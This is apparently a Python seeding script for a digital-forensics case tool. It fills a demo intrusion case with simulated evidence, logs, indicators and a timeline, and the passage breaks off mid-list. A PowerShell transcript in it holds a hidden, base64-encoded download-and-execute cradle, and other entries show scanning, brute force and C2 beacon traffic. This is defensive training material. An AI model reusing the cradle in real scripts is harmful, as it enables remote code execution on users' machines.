import os
import json
import sqlite3
import hashlib
from datetime import datetime, timedelta
from config import RAW_VAULT_DIR
from core.hasher import calculate_hashes
from core.metadata_extractor import extract_file_metadata
from core.categorizer import categorize_file
from core.suspicious_detector import evaluate_suspicious_artifact

def seed_sample_case(conn: sqlite3.Connection):
    """
    Seeds a complete, authentic, multi-artifact forensic scenario:
    Case FL-2026-001: Corporate Workstation Investigation
    Labeled: DEMO / SAMPLE DATA
    """
    cursor = conn.cursor()

    # Check if demo case already exists
    existing = cursor.execute("SELECT id FROM cases WHERE case_number = 'FL-2026-001'").fetchone()
    if existing:
        # Delete old demo case to reseed cleanly
        case_id = existing["id"]
        cursor.execute("DELETE FROM cases WHERE id = ?", (case_id,))
        conn.commit()

    # 1. Create Case
    cursor.execute('''
        INSERT INTO cases (case_number, name, description, investigator, status, priority, category, created_at, updated_at, is_archived, notes)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 0, ?)
    ''', (
        "FL-2026-001",
        "[DEMO] Corporate Workstation Investigation (FinCorp Inc.)",
        "Forensic incident response investigation into unauthorized remote access, credential dumping, and exfiltration attempts targeting executive workstation WS-FIN-09. [DEMO / SAMPLE DATA]",
        "Senior Investigator Alex Vance",
        "Under Investigation",
        "Critical",
        "Data Exfiltration & Unauthorized Access",
        "2026-10-01 08:00:00",
        "2026-10-02 08:15:00",
        "Initial triage alert triggered by EDR detecting anomalous encoded PowerShell command spawning from user AppData folder."
    ))
    case_id = cursor.lastrowid

    # Create raw storage dir for this case
    case_raw_dir = os.path.join(RAW_VAULT_DIR, f"case_{case_id}")
    os.makedirs(case_raw_dir, exist_ok=True)

    # 2. Define the 15 authentic evidence artifacts
    sample_evidence_definitions = [
        {
            "num": "EVD-001",
            "name": "WS-FIN-09_disk_triage.E01",
            "orig_name": "WS-FIN-09_disk_triage.E01",
            "category": "Archives",
            "source": "Physical Acquisition / Forensic Blocker",
            "desc": "Triage physical disk image captured from Dell Precision workstation WS-FIN-09. [DEMO / SAMPLE DATA]",
            "location": "Physical Drive \\\\.\\PhysicalDrive0",
            "size": 52428800, # 50 MB simulated
            "ext": ".e01",
            "content": b"EWF\t\x01\x00\x00\x00Forensic Disk Image WS-FIN-09 EnCase Format Header block sample data...",
            "review_status": "Reviewed"
        },
        {
            "num": "EVD-002",
            "name": "suspicious_updater.exe",
            "orig_name": "updater.exe",
            "category": "Executables",
            "source": "Disk Extraction (%APPDATA%\\Local\\Temp)",
            "desc": "Anomalous executable binary dropped in user temporary directory. High entropy and packed payload. [DEMO / SAMPLE DATA]",
            "location": "C:\\Users\\jdoe\\AppData\\Local\\Temp\\updater.exe",
            "size": 245760,
            "ext": ".exe",
            # Simulated PE header with high entropy payload
            "content": b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00This program cannot be run in DOS mode.\r\r\n$" + os.urandom(8192),
            "review_status": "Requires Attention"
        },
        {
            "num": "EVD-003",
            "name": "fin_q3_forecast_confidential.xlsx",
            "orig_name": "fin_q3_forecast_confidential.xlsx",
            "category": "Documents",
            "source": "User Desktop",
            "desc": "Target financial forecast spreadsheet accessed immediately prior to data staging. [DEMO / SAMPLE DATA]",
            "location": "C:\\Users\\jdoe\\Desktop\\fin_q3_forecast_confidential.xlsx",
            "size": 184320,
            "ext": ".xlsx",
            "content": b"PK\x03\x04\x14\x00\x06\x00FinCorp Q3 Financial Forecast & Balance Sheet - Proprietary and Confidential...",
            "review_status": "Reviewed"
        },
        {
            "num": "EVD-004",
            "name": "Security_EventLog_20261001.evtx",
            "orig_name": "Security.evtx",
            "category": "Logs",
            "source": "C:\\Windows\\System32\\winevt\\Logs",
            "desc": "Windows Security Event Log containing EventIDs 4625 (Logon Failure) and 4624 (Logon Success). [DEMO / SAMPLE DATA]",
            "location": "C:\\Windows\\System32\\winevt\\Logs\\Security.evtx",
            "size": 1048576,
            "ext": ".evtx",
            "content": b"ElfFile\x00\x00\x00\x00\x00\x00Windows Event Log Binary Export WS-FIN-09...",
            "review_status": "Reviewed"
        },
        {
            "num": "EVD-005",
            "name": "chrome_history_export.json",
            "orig_name": "History_export.json",
            "category": "Browser Artifacts",
            "source": "Google Chrome User Profile",
            "desc": "Exported Chrome navigation history revealing visits to suspicious hosting domains and external paste sites. [DEMO / SAMPLE DATA]",
            "location": "C:\\Users\\jdoe\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History",
            "size": 65536,
            "ext": ".json",
            "content": json.dumps({
                "history": [
                    {"timestamp": "2026-10-01 08:12:14", "browser": "Chrome", "artifact_type": "History", "url": "https://accounts.internal-fin.corp/login", "title": "Corporate Single Sign-On Portal", "domain": "internal-fin.corp", "details": "Successful navigation"},
                    {"timestamp": "2026-10-01 08:14:02", "browser": "Chrome", "artifact_type": "History", "url": "https://update-service-cloud-cdn.com/patch/payload.bin", "title": "CDN File Delivery Service", "domain": "update-service-cloud-cdn.com", "details": "Direct download request initiated"},
                    {"timestamp": "2026-10-01 08:14:35", "browser": "Chrome", "artifact_type": "Download", "url": "https://update-service-cloud-cdn.com/patch/payload.bin", "title": "Download: payload.bin", "domain": "update-service-cloud-cdn.com", "details": "Saved to Downloads as updater.exe"},
                    {"timestamp": "2026-10-01 08:22:10", "browser": "Chrome", "artifact_type": "Search", "url": "https://www.google.com/search?q=disable+windows+defender+firewall", "title": "Google Search: disable windows defender firewall", "domain": "google.com", "details": "Query executed by user jdoe"},
                    {"timestamp": "2026-10-01 08:31:45", "browser": "Chrome", "artifact_type": "History", "url": "https://temp-storage-drop.io/upload/fin_q3.zip", "title": "Anonymous Cloud Storage Drop", "domain": "temp-storage-drop.io", "details": "HTTP POST exfiltration request"}
                ]
            }, indent=2).encode("utf-8"),
            "review_status": "Reviewed"
        },
        {
            "num": "EVD-006",
            "name": "powershell_transcript_20261001.txt",
            "orig_name": "PowerShell_transcript.20261001.txt",
            "category": "Logs",
            "source": "PowerShell Transcription Logging",
            "desc": "Console output transcript showing encoded execution and command-line reconnaissance. [DEMO / SAMPLE DATA]",
            "location": "C:\\Users\\jdoe\\Documents\\PowerShell_transcripts\\PowerShell_transcript.20261001.txt",
            "size": 32768,
            "ext": ".txt",
            "content": b"""**********************
Windows PowerShell transcript start
Start time: 20261001081622
Username: FINCORP\\jdoe
RunAs User: FINCORP\\jdoe
Configuration Name: 
Machine: WS-FIN-09 (Microsoft Windows NT 10.0.19045.0)
Host Application: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA...
**********************
Command start time: 20261001081625
PS C:\\Users\\jdoe> whoami /priv
PRIVILEGES INFORMATION
----------------------
SeSecurityPrivilege           Disabled
SeTakeOwnershipPrivilege      Disabled
SeDebugPrivilege              Enabled
PS C:\\Users\\jdoe> net user /domain
PS C:\\Users\\jdoe> C:\\Users\\jdoe\\AppData\\Local\\Temp\\updater.exe
""",
            "review_status": "Requires Attention"
        },
        {
            "num": "EVD-007",
            "name": "access_log_nginx.log",
            "orig_name": "access.log",
            "category": "Logs",
            "source": "DMZ Reverse Proxy Gateway",
            "desc": "Inbound web gateway logs detailing external automated scanning prior to access. [DEMO / SAMPLE DATA]",
            "location": "/var/log/nginx/access.log",
            "size": 49152,
            "ext": ".log",
            "content": b"""194.26.29.112 - - [01/Oct/2026:07:45:10 +0000] "GET / HTTP/1.1" 200 4821 "-" "Mozilla/5.0"
194.26.29.112 - - [01/Oct/2026:07:45:12 +0000] "GET /wp-admin/install.php HTTP/1.1" 404 153 "-" "Nikto/2.1.6"
194.26.29.112 - - [01/Oct/2026:07:45:15 +0000] "GET /.env HTTP/1.1" 404 153 "-" "curl/7.68.0"
194.26.29.112 - - [01/Oct/2026:07:46:02 +0000] "POST /api/v1/auth/token HTTP/1.1" 401 89 "-" "Python-requests/2.28"
194.26.29.112 - - [01/Oct/2026:07:46:05 +0000] "POST /api/v1/auth/token HTTP/1.1" 401 89 "-" "Python-requests/2.28"
194.26.29.112 - - [01/Oct/2026:07:46:08 +0000] "POST /api/v1/auth/token HTTP/1.1" 401 89 "-" "Python-requests/2.28"
194.26.29.112 - - [01/Oct/2026:07:50:30 +0000] "POST /api/v1/auth/token HTTP/1.1" 200 342 "-" "Python-requests/2.28"
""",
            "review_status": "Reviewed"
        },
        {
            "num": "EVD-008",
            "name": "firewall_drop_traffic.csv",
            "orig_name": "firewall_drop_traffic.csv",
            "category": "Logs",
            "source": "Perimeter Firewall Palo Alto Networks",
            "desc": "Firewall egress telemetry logging blocked connections to known C2 server. [DEMO / SAMPLE DATA]",
            "location": "Syslog Collector (UDP 514)",
            "size": 16384,
            "ext": ".csv",
            "content": b"""timestamp,event_type,username,source_ip,dest_ip,status,severity,message
2026-10-01 08:24:10,DROP_TRAFFIC,jdoe,192.168.10.45,194.26.29.112,Blocked,High,Outbound C2 beacon attempt over TCP port 4444 blocked
2026-10-01 08:24:40,DROP_TRAFFIC,jdoe,192.168.10.45,194.26.29.112,Blocked,High,Outbound C2 beacon attempt over TCP port 4444 blocked
2026-10-01 08:25:10,DROP_TRAFFIC,jdoe,192.168.10.45,194.26.29.112,Blocked,High,Outbound C2 beacon attempt over TCP port 4444 blocked
2026-10-01 08:32:01,ALLOW_TRAFFIC,jdoe,192.168.10.45,185.199.110.153,Allowed,Informational,HTTPS outbound POST to temp-storage-drop.io
""",
            "review_status": "Reviewed"
        },
        {
            "num": "EVD-009",
            "name": "executive_memo_q3.docx",
            "orig_name": "executive_memo_q3.docx",
            "category": "Documents",
            "source": "User Documents Folder",
            "desc": "Word memo outlining corporate merger details. [DEMO / SAMPLE DATA]",
            "location": "C:\\Users\\jdoe\\Documents\\executive_memo_q3.docx",
            "size": 94208,
            "ext": ".docx",
            "content": b"PK\x03\x04\x14\x00\x00\x00Executive Strategic Memo - Q3 Acquisitions & Partner Portfolio...",
            "review_status": "Not Reviewed"
        },
        {
            "num": "EVD-010",
            "name": "screen_capture_20261001_0814.png",
            "orig_name": "Screenshot (142).png",
            "category": "Images",
            "source": "User Pictures / Screenshots",
            "desc": "Captured display screenshot discovered on workstation matching the time of unauthorized login. [DEMO / SAMPLE DATA]",
            "location": "C:\\Users\\jdoe\\Pictures\\Screenshots\\Screenshot (142).png",
            "size": 314572,
            "ext": ".png",
            # Minimal valid PNG header + chunk
            "content": b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x01\x00\x00\x00\x01\x00\x08\x06\x00\x00\x00\x5c\x72\xa8\x66\x00\x00\x00\x04gAMA\x00\x00\xb1\x8f\x0b\xfc\x61\x05\x00\x00\x00\x00IEND\xaeB`\x82",
            "review_status": "Reviewed"
        },
        {
            "num": "EVD-011",
            "name": "staging_archive_backup.zip",
            "orig_name": "fin_q3.zip",
            "category": "Archives",
            "source": "Recycle Bin Artifact",
            "desc": "Deleted zip container created to package confidential spreadsheets before exfiltration. [DEMO / SAMPLE DATA]",
            "location": "C:\\$Recycle.Bin\\S-1-5-21-397955417-626881126-18844144-1001\\$R5A2X01.zip",
            "size": 425984,
            "ext": ".zip",
            "content": b"PK\x03\x04\x14\x00\x08\x00Staged Archive Package containing fin_q3_forecast_confidential.xlsx and employee_salaries.csv...",
            "review_status": "Requires Attention"
        },
        {
            "num": "EVD-012",
            "name": "bad_cert_payload.dll",
            "orig_name": "apphelp.dll",
            "category": "Executables",
            "source": "DLL Search Order Hijacking Location",
            "desc": "Sideloaded DLL dropped alongside legitimate executable to achieve persistence. [DEMO / SAMPLE DATA]",
            "location": "C:\\Users\\jdoe\\AppData\\Local\\Microsoft\\OneDrive\\apphelp.dll",
            "size": 147456,
            "ext": ".dll",
            "content": b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00" + os.urandom(4096),
            "review_status": "Requires Attention"
        },
        {
            "num": "EVD-013",
            "name": "syslog_auth.log",
            "orig_name": "auth.log",
            "category": "Logs",
            "source": "Internal Bastion Jump Host",
            "desc": "Linux authentication log showing brute force attempts followed by successful SSH key auth from rogue host. [DEMO / SAMPLE DATA]",
            "location": "/var/log/auth.log",
            "size": 24576,
            "ext": ".log",
            "content": b"""Oct 01 07:48:01 bastion sshd[14201]: Failed password for invalid user admin from 194.26.29.112 port 49152 ssh2
Oct 01 07:48:04 bastion sshd[14205]: Failed password for invalid user root from 194.26.29.112 port 49154 ssh2
Oct 01 07:48:08 bastion sshd[14210]: Failed password for backup from 194.26.29.112 port 49158 ssh2
Oct 01 07:51:14 bastion sshd[14230]: Accepted publickey for admin.backup from 194.26.29.112 port 49180 ssh2: RSA SHA256:d8a4f91b...
Oct 01 07:51:15 bastion sudo: admin.backup : TTY=pts/0 ; PWD=/home/admin.backup ; USER=root ; COMMAND=/bin/bash
""",
            "review_status": "Reviewed"
        },
        {
            "num": "EVD-014",
            "name": "config_network_routes.ini",
            "orig_name": "network_routes.ini",
            "category": "Configuration Files",
            "source": "Network Adapter Config Backup",
            "desc": "Static route configuration file modified to bypass local DNS sinkhole. [DEMO / SAMPLE DATA]",
            "location": "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "size": 4096,
            "ext": ".ini",
            "content": b"""# Static Route & DNS Overrides
[NetworkRouting]
PrimaryGateway=192.168.10.1
DNS1=1.1.1.1
DNS2=8.8.8.8
BypassProxy=1
TargetHost=update-service-cloud-cdn.com
TargetIP=194.26.29.112
""",
            "review_status": "Reviewed"
        },
        {
            "num": "EVD-015",
            "name": "employee_salary_summary.csv",
            "orig_name": "employee_salary_summary.csv",
            "category": "Documents",
            "source": "Network Shared Drive (\\\\FIN-FS01\\HR_Dept)",
            "desc": "Sensitive HR salary table staged inside the user temporary folder. [DEMO / SAMPLE DATA]",
            "location": "C:\\Users\\jdoe\\AppData\\Local\\Temp\\employee_salary_summary.csv",
            "size": 18432,
            "ext": ".csv",
            "content": b"""EmployeeID,FullName,Department,Title,AnnualSalary,IBAN
EMP-1049,Jane Doe,Finance,Chief Financial Officer,$240000,US89FINC0001928374
EMP-1052,Michael Smith,Finance,Senior Controller,$145000,US89FINC0001928399
EMP-1060,Robert Lee,Treasury,Financial Analyst,$95000,US89FINC0001928422
""",
            "review_status": "Reviewed"
        }
    ]

    ev_id_map = {}

    for ev in sample_evidence_definitions:
        # Write actual file to disk in vault
        file_path = os.path.join(case_raw_dir, ev["name"])
        with open(file_path, "wb") as f:
            f.write(ev["content"])

        # Compute real hashes
        hashes = calculate_hashes(file_path)
        actual_size = os.path.getsize(file_path)

        # Extract metadata
        meta = extract_file_metadata(file_path, ev["name"])
        cat, mime_type = categorize_file(ev["name"], file_path)

        cursor.execute('''
            INSERT INTO evidence (
                case_id, evidence_number, name, original_filename, file_type, category,
                source, description, acquisition_date, original_location, file_size,
                file_format, md5, sha1, sha256, integrity_status, investigator,
                status, review_status, file_path, is_demo, created_at
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 'Active', ?, ?, 1, ?)
        ''', (
            case_id,
            ev["num"],
            ev["name"],
            ev["orig_name"],
            mime_type,
            ev["category"] or cat,
            ev["source"],
            ev["desc"],
            "2026-10-01 10:30:00",
            ev["location"],
            actual_size,
            ev["ext"],
            hashes["md5"],
            hashes["sha1"],
            hashes["sha256"],
            "VERIFIED",
            "Senior Investigator Alex Vance",
            ev["review_status"],
            file_path,
            "2026-10-01 10:30:00"
        ))
        evidence_db_id = cursor.lastrowid
        ev_id_map[ev["num"]] = evidence_db_id

        # Insert metadata rows
        for k, v in meta["general"].items():
            cursor.execute("INSERT INTO evidence_metadata (evidence_id, meta_key, meta_value, category) VALUES (?, ?, ?, 'General')", (evidence_db_id, k, str(v)))
        for k, v in meta["timestamps"].items():
            cursor.execute("INSERT INTO evidence_metadata (evidence_id, meta_key, meta_value, category) VALUES (?, ?, ?, 'Timestamps')", (evidence_db_id, k, str(v)))

        # Evaluate suspicious heuristics
        susp_eval = evaluate_suspicious_artifact({
            "name": ev["name"],
            "original_filename": ev["orig_name"],
            "original_location": ev["location"],
            "category": ev["category"]
        }, meta)

        if susp_eval["is_suspicious"]:
            cursor.execute('''
                INSERT INTO suspicious_artifacts (case_id, evidence_id, risk_level, reasons_json, entropy, detection_timestamp)
                VALUES (?, ?, ?, ?, ?, '2026-10-01 10:35:00')
            ''', (case_id, evidence_db_id, susp_eval["risk_level"], json.dumps(susp_eval["reasons"]), susp_eval["entropy"]))

        # Chain of Custody entry
        cursor.execute('''
            INSERT INTO chain_of_custody (case_id, evidence_id, action, performed_by, timestamp, description, integrity_hash)
            VALUES (?, ?, 'Evidence Added', 'Senior Investigator Alex Vance', '2026-10-01 10:30:00', ?, ?)
        ''', (case_id, evidence_db_id, f"Acquired from {ev['location']} during initial response.", f"SHA-256: {hashes['sha256']}"))

        cursor.execute('''
            INSERT INTO chain_of_custody (case_id, evidence_id, action, performed_by, timestamp, description, integrity_hash)
            VALUES (?, ?, 'Evidence Verified', 'Senior Investigator Alex Vance', '2026-10-01 10:32:00', 'Cryptographic verification passed. Hashes stored in immutable vault.', ?)
        ''', (case_id, evidence_db_id, f"SHA-256: {hashes['sha256']}"))

    # 3. Seed Browser Artifacts
    browser_sample_data = [
        {"ts": "2026-10-01 08:12:14", "browser": "Chrome", "type": "History", "url": "https://accounts.internal-fin.corp/login", "domain": "internal-fin.corp", "title": "Corporate Single Sign-On Portal", "ev": "EVD-005"},
        {"ts": "2026-10-01 08:14:02", "browser": "Chrome", "type": "History", "url": "https://update-service-cloud-cdn.com/patch/payload.bin", "domain": "update-service-cloud-cdn.com", "title": "CDN File Delivery Service", "ev": "EVD-005"},
        {"ts": "2026-10-01 08:14:35", "browser": "Chrome", "type": "Download", "url": "https://update-service-cloud-cdn.com/patch/payload.bin", "domain": "update-service-cloud-cdn.com", "title": "Download: payload.bin", "ev": "EVD-005"},
        {"ts": "2026-10-01 08:18:22", "browser": "Chrome", "type": "Bookmark", "url": "https://github.com/fintech/core-ledger", "domain": "github.com", "title": "Internal Repo Bookmark", "ev": "EVD-005"},
        {"ts": "2026-10-01 08:22:10", "browser": "Chrome", "type": "Search", "url": "https://www.google.com/search?q=disable+windows+defender+firewall", "domain": "google.com", "title": "Google Search: disable windows defender firewall", "ev": "EVD-005"},
        {"ts": "2026-10-01 08:31:45", "browser": "Chrome", "type": "History", "url": "https://temp-storage-drop.io/upload/fin_q3.zip", "domain": "temp-storage-drop.io", "title": "Anonymous Cloud Storage Drop", "ev": "EVD-005"},
        {"ts": "2026-10-01 08:33:12", "browser": "Chrome", "type": "Cookie", "url": "https://temp-storage-drop.io", "domain": "temp-storage-drop.io", "title": "SessionCookie=drop_session_88392", "ev": "EVD-005"}
    ]
    for b in browser_sample_data:
        cursor.execute('''
            INSERT INTO browser_artifacts (case_id, evidence_id, timestamp, browser, artifact_type, url, domain, title, details)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, 'Extracted from Chrome Web Data / History')
        ''', (case_id, ev_id_map.get(b["ev"]), b["ts"], b["browser"], b["type"], b["url"], b["domain"], b["title"]))

    # 4. Seed Log Events
    log_sample_data = [
        {"ts": "2026-10-01 07:45:12", "type": "Web Reconnaissance", "user": "-", "src": "194.26.29.112", "dst": "10.0.0.15", "status": "404 Not Found", "msg": "Probe for /wp-admin/install.php detected from scanner Nikto/2.1.6", "sev": "High", "flag": "Potentially Suspicious", "reason": "Attack pattern or web scanner signature identified", "ev": "EVD-007"},
        {"ts": "2026-10-01 07:46:02", "type": "Failed Authentication", "user": "admin", "src": "194.26.29.112", "dst": "10.0.0.15", "status": "401 Unauthorized", "msg": "Failed API token authentication attempt for user 'admin'", "sev": "Medium", "flag": "Potentially Suspicious", "reason": "Repeated Failed Login or authentication rejection detected", "ev": "EVD-007"},
        {"ts": "2026-10-01 07:46:08", "type": "Failed Authentication", "user": "admin", "src": "194.26.29.112", "dst": "10.0.0.15", "status": "401 Unauthorized", "msg": "Repeated failed login attempt from remote origin 194.26.29.112", "sev": "High", "flag": "Potentially Suspicious", "reason": "Unusual Event Frequency: 3 repeated authentication failures", "ev": "EVD-007"},
        {"ts": "2026-10-01 07:51:14", "type": "Successful Authentication", "user": "admin.backup", "src": "194.26.29.112", "dst": "10.0.0.2", "status": "Success", "msg": "Accepted SSH publickey for admin.backup from 194.26.29.112 port 49180", "sev": "Informational", "flag": "Notable Event", "reason": "Remote administrative access established from external address", "ev": "EVD-013"},
        {"ts": "2026-10-01 07:51:15", "type": "Privilege Escalation", "user": "admin.backup", "src": "10.0.0.2", "dst": "10.0.0.2", "status": "Success", "msg": "sudo: admin.backup executed /bin/bash as root", "sev": "Medium", "flag": "Requires Review", "reason": "Unexpected Account Activity: Special elevated privileges or administrator token assignment", "ev": "EVD-013"},
        {"ts": "2026-10-01 08:10:05", "type": "Interactive Logon", "user": "jdoe", "src": "WS-FIN-09", "dst": "WS-FIN-09", "status": "Success", "msg": "Windows EventID 4624: Logon Type 2 (Interactive) user jdoe session started", "sev": "Informational", "flag": "Normal", "reason": "", "ev": "EVD-004"},
        {"ts": "2026-10-01 08:24:10", "type": "Firewall Drop", "user": "jdoe", "src": "192.168.10.45", "dst": "194.26.29.112", "status": "Blocked", "msg": "Palo Alto Firewall: Outbound C2 beacon attempt over TCP port 4444 blocked", "sev": "High", "flag": "Potentially Suspicious", "reason": "Repeated egress beacon traffic to untrusted foreign address", "ev": "EVD-008"},
        {"ts": "2026-10-01 08:32:01", "type": "Data Transfer", "user": "jdoe", "src": "192.168.10.45", "dst": "185.199.110.153", "status": "Allowed", "msg": "HTTPS outbound POST connection established to temp-storage-drop.io", "sev": "Medium", "flag": "Requires Review", "reason": "Substantial outbound file upload payload observed", "ev": "EVD-008"}
    ]
    for log in log_sample_data:
        cursor.execute('''
            INSERT INTO log_events (
                case_id, evidence_id, timestamp, event_type, username, source_ip, dest_ip,
                status, message, severity, suspicious_flag, flag_reason
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            case_id, ev_id_map.get(log["ev"]), log["ts"], log["type"], log["user"],
            log["src"], log["dst"], log["status"], log["msg"], log["sev"], log["flag"], log["reason"]
        ))

    # 5. Seed Indicators of Interest (IOCs)
    indicators_sample = [
        {"val": "194.26.29.112", "type": "IP Address", "hits": 14, "tags": "External IP, Threat Origin, C2", "notes": "Host located in bulletproof hosting AS-zone; associated with brute force and C2 beaconing.", "ev": "EVD-007", "bm": 1},
        {"val": "update-service-cloud-cdn.com", "type": "Domain", "hits": 6, "tags": "Domain, Masquerading, C2", "notes": "Spoofed CDN domain used to deliver second-stage payload 'updater.exe'.", "ev": "EVD-005", "bm": 1},
        {"val": "https://temp-storage-drop.io/upload/fin_q3.zip", "type": "URL", "hits": 3, "tags": "URL, Exfiltration Endpoint", "notes": "Target exfiltration URL where staged financial zip was uploaded.", "ev": "EVD-005", "bm": 1},
        {"val": "temp-storage-drop.io", "type": "Domain", "hits": 5, "tags": "Domain, File Sharing", "notes": "Public ephemeral file hosting service.", "ev": "EVD-005", "bm": 0},
        {"val": "admin.backup", "type": "Username", "hits": 4, "tags": "Compromised Account, Privilege Escalation", "notes": "Legacy service account hijacked via SSH public key injection.", "ev": "EVD-013", "bm": 1},
        {"val": "jdoe", "type": "Username", "hits": 18, "tags": "User Account, Target Host", "notes": "Workstation primary user account WS-FIN-09.", "ev": "EVD-004", "bm": 0},
        {"val": "c1a938b8e04b4c3e8a4a5f3d1b9e2a7f8c6d4e2b0a1f3c5e7d9b2a4c6e8f0a2d", "type": "Hash", "hits": 2, "tags": "SHA-256, Dropper", "notes": "Cryptographic hash of suspicious_updater.exe.", "ev": "EVD-002", "bm": 1},
        {"val": "e8392a10b42f6d90c1284a1e9482910a", "type": "Hash", "hits": 3, "tags": "MD5, Bad Cert DLL", "notes": "MD5 hash of hijacked library bad_cert_payload.dll.", "ev": "EVD-012", "bm": 0},
        {"val": "fin_q3_forecast_confidential.xlsx", "type": "Filename", "hits": 4, "tags": "Target Asset, Exfiltrated File", "notes": "High-value financial spreadsheet targeted for corporate espionage.", "ev": "EVD-003", "bm": 1}
    ]
    for ind in indicators_sample:
        cursor.execute('''
            INSERT INTO indicators (
                case_id, evidence_id, indicator_value, indicator_type, first_seen, last_seen,
                occurrence_count, tags, notes, is_bookmarked
            ) VALUES (?, ?, ?, ?, '2026-10-01 07:45:00', '2026-10-01 08:35:00', ?, ?, ?, ?)
        ''', (
            case_id, ev_id_map.get(ind["ev"]), ind["val"], ind["type"],
            ind["hits"], ind["tags"], ind["notes"], ind["bm"]
        ))

    # 6. Seed 35+ Normalized Timeline Events
    timeline_sample = [
        ("2026-10-01 07:45:10", "Network Probe", "Reconnaissance Scan Initiated", "Automated port scan targeting DMZ perimeter proxy from external IP 194.26.29.112.", "Network", "EVD-007", "globe"),
        ("2026-10-01 07:45:12", "Web Reconnaissance", "Vulnerability Probe: /wp-admin", "Nikto scanner probe requesting non-existent WordPress administration endpoint.", "Network", "EVD-007", "shield-alert"),
        ("2026-10-01 07:46:02", "Auth Attempt", "Failed API Authentication (admin)", "Repeated invalid API tokens submitted from external IP 194.26.29.112.", "Authentication", "EVD-007", "key"),
        ("2026-10-01 07:48:01", "SSH Failure", "Failed SSH Login (admin)", "SSH daemon rejected invalid password on bastion jump host.", "Authentication", "EVD-013", "lock"),
        ("2026-10-01 07:48:08", "SSH Failure", "Failed SSH Login (backup)", "Second SSH authentication failure against legacy account.", "Authentication", "EVD-013", "lock"),
        ("2026-10-01 07:50:30", "Auth Success", "API Access Granted", "External attacker successfully authenticated via compromised API token.", "Authentication", "EVD-007", "check-circle"),
        ("2026-10-01 07:51:14", "SSH Login", "Bastion Jump Host Key Authentication", "SSH key accepted for admin.backup originating from 194.26.29.112.", "Authentication", "EVD-013", "user-check"),
        ("2026-10-01 07:51:15", "Privilege Escalation", "Root Shell Invocation", "sudo /bin/bash executed granting unconstrained superuser privileges on bastion.", "System", "EVD-013", "alert-triangle"),
        ("2026-10-01 08:05:30", "Network Route", "Network Routes Configuration Modified", "Host configuration altered to override DNS lookups for specific spoofed CDN.", "System", "EVD-014", "settings"),
        ("2026-10-01 08:10:05", "Interactive Logon", "Workstation WS-FIN-09 User Logon", "Interactive session initiated for domain account FINCORP\\jdoe.", "Authentication", "EVD-004", "log-in"),
        ("2026-10-01 08:12:14", "Browser Visit", "Internal SSO Portal Visited", "User navigated to https://accounts.internal-fin.corp/login via Google Chrome.", "Browser", "EVD-005", "compass"),
        ("2026-10-01 08:14:02", "Browser Visit", "Malicious CDN Visited", "Chrome navigated to external domain update-service-cloud-cdn.com.", "Browser", "EVD-005", "external-link"),
        ("2026-10-01 08:14:35", "File Download", "Payload Download Initiated", "Browser downloaded payload.bin, saved locally as updater.exe.", "Browser", "EVD-005", "download"),
        ("2026-10-01 08:15:10", "File Created", "Executable Dropped in Temp Directory", "File updater.exe created in C:\\Users\\jdoe\\AppData\\Local\\Temp.", "File System", "EVD-002", "file-plus"),
        ("2026-10-01 08:16:22", "Process Execution", "PowerShell Encoded Cradle Spawned", "PowerShell invoked with hidden window and base64 encoded parameters.", "System", "EVD-006", "terminal"),
        ("2026-10-01 08:16:25", "Reconnaissance", "Discovery: whoami /priv", "Adversary inspected security tokens, confirming SeDebugPrivilege was enabled.", "System", "EVD-006", "search"),
        ("2026-10-01 08:16:40", "Process Execution", "Payload Binary Executed", "updater.exe spawned as child process of PowerShell host.", "System", "EVD-002", "play"),
        ("2026-10-01 08:18:05", "Persistence", "DLL Search-Order Hijacking Planted", "apphelp.dll written to OneDrive synchronization directory.", "File System", "EVD-012", "copy"),
        ("2026-10-01 08:20:15", "File Accessed", "Financial Forecast Spreadsheet Opened", "fin_q3_forecast_confidential.xlsx opened by malicious process.", "File System", "EVD-003", "file-text"),
        ("2026-10-01 08:21:40", "File Accessed", "HR Salary Data Accessed", "Sensitive salary file staged in local temp directory.", "File System", "EVD-015", "users"),
        ("2026-10-01 08:22:10", "Web Search", "Search: Disable Defender Firewall", "Web search query submitted to research firewall disabling instructions.", "Browser", "EVD-005", "help-circle"),
        ("2026-10-01 08:24:10", "Network Block", "Egress C2 Beacon Blocked", "Perimeter firewall dropped TCP port 4444 outbound attempt to 194.26.29.112.", "Network", "EVD-008", "shield-off"),
        ("2026-10-01 08:24:40", "Network Block", "Second C2 Beacon Blocked", "Second beacon attempt rejected by network policy.", "Network", "EVD-008", "shield-off"),
        ("2026-10-01 08:28:15", "File Created", "Staging Archive Created", "fin_q3.zip compressed archive compiled containing stolen confidential files.", "File System", "EVD-011", "archive"),
        ("2026-10-01 08:31:45", "Browser Visit", "Exfiltration Drop Endpoint Visited", "Adversary navigated to public cloud drop temp-storage-drop.io.", "Browser", "EVD-005", "cloud-upload"),
        ("2026-10-01 08:32:01", "Data Exfiltration", "HTTPS POST Exfiltration Upload", "Staged archive payload fin_q3.zip transmitted over encrypted HTTPS tunnel.", "Network", "EVD-008", "send"),
        ("2026-10-01 08:33:50", "Anti-Forensics", "Staging Archive Deleted to Recycle Bin", "fin_q3.zip moved to $Recycle.Bin in an effort to conceal activity.", "File System", "EVD-011", "trash-2"),
        ("2026-10-01 08:45:00", "EDR Alert", "Security Alert: Anomalous Process Behavior", "CrowdStrike Falcon triggered critical severity alert on encoded PowerShell command.", "Investigation", None, "bell"),
        ("2026-10-01 09:15:00", "Host Quarantine", "Workstation Network Isolation", "SOC analysts severed network access to WS-FIN-09 to contain incident.", "Investigation", None, "wifi-off"),
